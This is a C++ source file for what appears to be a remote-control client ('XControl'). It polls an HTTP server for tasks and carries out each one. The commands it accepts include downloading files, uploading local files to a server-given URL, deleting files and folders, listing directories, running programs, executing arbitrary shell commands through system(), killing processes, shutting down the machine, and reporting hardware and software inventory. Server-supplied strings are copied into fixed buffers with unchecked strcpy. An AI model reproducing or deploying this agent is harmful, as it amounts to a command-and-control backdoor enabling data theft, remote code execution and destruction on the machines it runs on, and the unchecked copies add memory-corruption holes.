#include "XControl_Hdr.h"

XHTHREAD XControl_Thread_HttpTask()
{
	TCHAR tszTaskUrl[MAX_PATH];
	memset(tszTaskUrl, '\0', MAX_PATH);

	while (bIsRun)
	{
		int nBLen = 0;
		CHAR* ptszMsgBody = NULL;

		_stprintf(tszTaskUrl, _T("api?function=gettask&serial=%llu"), m_nTaskSerial);

		if (APIClient_Http_Request("GET", st_ServiceConfig.tszTaskUrl, NULL, NULL, &ptszMsgBody, &nBLen))
	    {
			XControl_Task_ProtocolParse(ptszMsgBody, nBLen);
			BaseLib_OperatorMemory_FreeCStyle((XPPMEM)&ptszMsgBody);
		}
		std::this_thread::sleep_for(std::chrono::milliseconds(st_ServiceConfig.st_Time.nHTTPThreadTime));
	}
	return 0;
}
//////////////////////////////////////////////////////////////////////////
BOOL XControl_Task_ProtocolParse(LPCSTR lpszMsgBuffer, int nMsgLen)
{
	Json::Value st_JsonRoot;
	Json::CharReaderBuilder st_JsonBuild;
	Json::CharReader* pSt_JsonReader(st_JsonBuild.newCharReader());
	JSONCPP_STRING st_JsonError;

	if (!pSt_JsonReader->parse(lpszMsgBuffer, lpszMsgBuffer + nMsgLen, &st_JsonRoot, &st_JsonError))
	{
		XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, "HTTP任务:JSON解析错误");
		return FALSE;
	}
	delete pSt_JsonReader;
	pSt_JsonReader = NULL;
	//获得任务序列号
	__int64u nTaskSerial = st_JsonRoot["nTaskSerial"].asUInt64();
	if (nTaskSerial != m_nTaskSerial)
	{
		XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, "HTTP任务:任务序列号不正确");
		return FALSE;
	}
	m_nTaskSerial++;
	//执行任务
	switch (st_JsonRoot["unOperatorCode"].asUInt())
	{
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_DOWNFILE:
	{
		CHAR tszFileUrl[MAX_PATH];
		CHAR tszSaveUrl[MAX_PATH];

		memset(tszFileUrl, '\0', MAX_PATH);
		memset(tszSaveUrl, '\0', MAX_PATH);
		strcpy(tszFileUrl, st_JsonRoot["DownloadUrl"].asCString());
		strcpy(tszSaveUrl, st_JsonRoot["SaveUrl"].asCString());

		XHANDLE xhTask = APIClient_File_Create(tszFileUrl, tszSaveUrl);
		if (NULL == xhTask)
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, "HTTP任务:下载任务处理失败,错误码:%lX", APIClient_GetLastError());
			return FALSE;
		}
		while (TRUE)
		{
			NETHELP_FILEINFO st_TaskInfo;
			memset(&st_TaskInfo, '\0', sizeof(NETHELP_FILEINFO));

			if (APIClient_File_Query(xhTask, &st_TaskInfo))
			{
				if (ENUM_NETHELP_APICLIENT_FILE_STATUS_DOWNLOADDING != st_TaskInfo.en_DownStatus)
				{
					break;
				}
			}
		}
		APIClient_File_Delete(xhTask);
	}
	break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_DELETEFILE:
		CHAR tszDelFile[MAX_PATH];
		memset(tszDelFile, '\0', MAX_PATH);

		strcpy(tszDelFile, st_JsonRoot["DeleteFile"].asCString());
		if (-1 == remove(tszDelFile))
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, "HTTP任务:删除文件任务处理失败,错误码:%d", errno);
			return FALSE;
		}
		break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_DELETEDIR:
		CHAR tszDelDir[MAX_PATH];
		memset(tszDelDir, '\0', MAX_PATH);

		strcpy(tszDelDir, st_JsonRoot["DeleteDir"].asCString());
		if (!SystemApi_File_DeleteMutilFolder(tszDelDir))
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, "HTTP任务:删除文件夹任务处理失败,错误码:%lX", SystemApi_GetLastError());
			return FALSE;
		}
		break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_UPFILE:
	{
		CHAR tszUPFile[MAX_PATH];
		CHAR tszUPUrl[MAX_PATH];

		memset(tszUPFile, '\0', MAX_PATH);
		memset(tszUPUrl, '\0', MAX_PATH);
		strcpy(tszUPFile, st_JsonRoot["UPLoadFile"].asCString());
		strcpy(tszUPUrl, st_JsonRoot["UPLoadUrl"].asCString());

		XHANDLE xhTask = APIClient_File_Create(tszUPFile, tszUPUrl, FALSE);
		if (NULL == xhTask)
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, "HTTP任务:FTP上传任务处理失败,错误码:%lX", APIClient_GetLastError());
			return FALSE;
		}
		while (TRUE)
		{
			NETHELP_FILEINFO st_TaskInfo;
			memset(&st_TaskInfo, '\0', sizeof(NETHELP_FILEINFO));

			if (APIClient_File_Query(xhTask, &st_TaskInfo))
			{
				if (ENUM_NETHELP_APICLIENT_FILE_STATUS_DOWNLOADDING != st_TaskInfo.en_DownStatus)
				{
					break;
				}
			}
		}
		APIClient_File_Delete(xhTask);
	}
	break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_GETLIST:
	{
		int nListCount = 0;
		CHAR** ppszFileList;
		if (SystemApi_File_EnumFile(st_JsonRoot["FindPath"].asCString(), &ppszFileList, &nListCount))
		{
			XControl_Handle_PostListFile(ppszFileList, nListCount, st_JsonRoot["PostUrl"].asCString());
			BaseLib_OperatorMemory_Free((XPPPMEM)&ppszFileList, nListCount);
		}
		else
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, "HTTP任务:请求文件列表失败,错误码:%lX", SystemApi_GetLastError());
		}
	}
		break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_EXEC:
	{
		DWORD dwProcessID = 0;
		if (SystemApi_Process_CreateProcess(&dwProcessID, st_JsonRoot["ExecFile"].asCString(),NULL, st_JsonRoot["ExecShow"].asInt()))
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_INFO, "HTTP任务:请求创建进程成功,进程:%s", st_JsonRoot["ExecFile"].asCString());
		}
		else
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, "HTTP任务:请求创建进程:%s 失败,错误码:%lX", st_JsonRoot["ExecFile"].asCString(), SystemApi_GetLastError());
		}
	}
		break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_POPMESSAGE:
	{
#ifdef _MSC_BUILD
		MessageBoxA(NULL, st_JsonRoot["MessageBox"].asCString(), "提示", MB_OK);
#else
#endif
		XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_INFO, "HTTP任务:请求弹出消息:%s", st_JsonRoot["MessageBox"].asCString());
	}
	break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_STOPPROCESS:
		if (!SystemApi_Process_Stop(st_JsonRoot["tszProcessName"].asCString()))
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, "HTTP任务:请求停止进程失败,错误码:%lX", SystemApi_GetLastError());
			return FALSE;
		}
		break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_SHUTDOWN:
		if (!SystemApi_System_Shutdown((DWORD)st_JsonRoot["ShutDownType"].asInt64()))
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, "HTTP任务:请求关机失败,错误码:%lX", SystemApi_GetLastError());
			return FALSE;
		}
		break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_ECMD:
		if (-1 == system(st_JsonRoot["tszExecCmd"].asCString()))
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, "HTTP任务:请求执行命令失败,错误码:%lX", SystemApi_GetLastError());
			return FALSE;
		}
		break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_REPORT:
	{
		if (0 == st_JsonRoot["nType"].asInt())
		{
			int nHWLen = 4096;
			CHAR tszHWBuffer[4096];
			memset(tszHWBuffer, '\0', sizeof(tszHWBuffer));
			XControl_Info_HardWare(tszHWBuffer, &nHWLen);
			APIClient_Http_Request("POST", st_JsonRoot["tszIPAddr"].asCString(), tszHWBuffer);
		}
		else
		{
			int nSWLen = 4096;
			CHAR tszSWBuffer[4096];
			memset(tszSWBuffer, '\0', sizeof(tszSWBuffer));
			XControl_Info_SoftWare(tszSWBuffer, &nSWLen);
			APIClient_Http_Request("POST", st_JsonRoot["tszIPAddr"].asCString(), tszSWBuffer);
		}
	}
		break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_ENUMDEVICE:
	{
		int nACount = 0;
		int nVCount = 0;
		AVHELP_DEVICEINFO** ppSt_AudioList;
		AVHELP_DEVICEINFO** ppSt_VideoList;

		int nMsgLen = 0;
		TCHAR tszMsgBuffer[4096];
		memset(tszMsgBuffer, '\0', sizeof(tszMsgBuffer));

		AVHelp_Device_EnumDevice(&ppSt_AudioList, &ppSt_VideoList, &nACount, &nVCount);
		Protocol_Packet_EnumDevice(tszMsgBuffer, &nMsgLen, &ppSt_AudioList, &ppSt_VideoList, nACount, nVCount);
		BaseLib_OperatorMemory_Free((void***)&ppSt_AudioList, nACount);
		BaseLib_OperatorMemory_Free((void***)&ppSt_VideoList, nVCount);
	}
		break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_SERIAL:
		m_nTaskSerial = st_JsonRoot["nSerial"].asUInt64();
		break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_USER:
		break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_NOTHINGTODO:
		break;
	default:
		XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, "HTTP任务:请求的操作码不支持,操作码:%d", st_JsonRoot["unOperatorCode"].asUInt());
		return FALSE;
	}
	return TRUE;
}